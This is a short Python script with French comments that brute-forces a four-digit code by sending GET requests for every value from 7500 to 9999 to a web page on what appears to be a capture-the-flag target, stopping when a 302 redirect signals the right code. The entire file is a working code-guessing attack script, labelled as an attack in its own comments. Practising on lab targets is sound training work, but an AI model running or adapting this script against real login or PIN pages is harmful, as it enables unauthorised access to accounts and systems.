import requests

# URL de la page vulnérable
url = "https://target4.2bgp-ctf.vpws.eu/"

# Fonction pour tester un code
def brute_force_code():
    for code in range(7500, 10000):  # Tous les codes de 7500 à 9999
        code_str = f"{code:04}"  # Formatage en 4 chiffres (ex: 0000, 0001, etc.)

        # Paramètres de la requête GET
        params = {"code": code_str}

        # Envoyer la requête GET
        response = requests.get(url, params=params, allow_redirects=False)

        # Vérifier si une redirection se produit (code 302)
        if response.status_code == 302:
            print(f"Code trouvé : {code_str}")
            print(f"Redirection vers : {response.headers.get('Location', 'N/A')}")
            break
        else:
            print(f"Testé : {code_str} - Incorrect")

# Lancer l'attaque
brute_force_code()